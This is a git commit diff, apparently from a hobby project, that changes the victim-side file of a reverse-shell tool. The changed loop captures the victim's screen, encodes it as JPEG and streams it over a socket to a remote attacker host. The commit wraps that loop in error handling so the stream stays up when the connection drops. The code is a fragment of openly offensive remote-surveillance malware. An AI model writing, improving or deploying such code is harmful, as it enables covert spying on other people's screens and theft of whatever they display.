1ed841fcfde27724a3696f5e4cc3e89453fc1e3c
roeis <roeiyishayry@gmail.com>
2024-05-17 12:28:44 +0300

    fixed connect disconnect issues

--- Reverse shell/Victim/main.py
+++ Reverse shell/Victim/main.py
@@ -16,16 +16,19 @@ def stream_to_server(ip, port):
     s.connect((ip, port))
 
     while client_global_flags_a.streaming:
-        screen = ImageGrab.grab()
-        frame = np.array(screen)
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 50]
-        ret, buffer = cv2.imencode('.jpg', frame, encode_param)
-        frame = buffer.tobytes()
-        # Send the length of the frame
-        s.sendall(len(frame).to_bytes(6, byteorder='big'))
-        # Send the frame data
-        s.sendall(frame)
+        try:
+            screen = ImageGrab.grab()
+            frame = np.array(screen)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 50]
+            ret, buffer = cv2.imencode('.jpg', frame, encode_param)
+            frame = buffer.tobytes()
+            # Send the length of the frame
+            s.sendall(len(frame).to_bytes(6, byteorder='big'))
+            # Send the frame data
+            s.sendall(frame)
+        except ConnectionResetError:
+            pass
 
     s.close()
 
